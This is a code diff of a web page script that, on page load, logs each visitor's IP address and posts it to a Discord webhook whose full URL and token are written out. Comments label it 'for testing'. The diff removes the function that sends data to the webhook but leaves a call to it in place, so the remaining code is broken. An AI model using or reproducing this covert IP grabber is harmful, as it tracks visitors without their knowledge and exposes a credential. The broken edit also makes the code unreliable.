@@ -420,43 +420,24 @@
         // Your webhook URL - replace with your actual webhook
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1388139167103582218/OTZHoiUd0w-XiBleGI5w_U8iE2rfZuQhpA6AT7Yo8n-iofiK1xWQVaxqFjEx0WBPJ6rt";
         
-        // Log data to webhook
-        async function logToWebhook(data) {
-            try {
-                const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        content: `**New Log Entry**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``
-                    })
-                });
-                
-                if (!response.ok) {
-                    console.error('Webhook error:', response.status);
-                }
-            } catch (error) {
-                console.error('Error sending to webhook:', error);
-            }
-        }
+function logData(eventType, data) {
+    console.log(`[TEST LOG] ${eventType}:`, data);
 
-        // Logging function for testing purposes
-        function logData(eventType, data) {
-            console.log(`[TEST LOG] ${eventType}:`, data);
-            
-            // Update status text
-            document.getElementById('statusText').textContent = `IP Logged: ${data.ip || 'N/A'}`;
-            
-            // Send to webhook
-            const logData = {
-                event: eventType,
-                timestamp: new Date().toISOString(),
-                ...data
-            };
-            
-            logToWebhook(logData);
-        }
+    // Prevent error if #statusText does not exist
+    const statusText = document.getElementById('statusText');
+    if (statusText) {
+        statusText.textContent = `IP Logged: ${data.ip || 'N/A'}`;
+    }
+
+    const logPayload = {
+        event: eventType,
+        timestamp: new Date().toISOString(),
+        ...data
+    };
+
+    logToWebhook(logPayload);
+}
+
 
         document.addEventListener('DOMContentLoaded', function() {
             // Log IP address on page load for testing
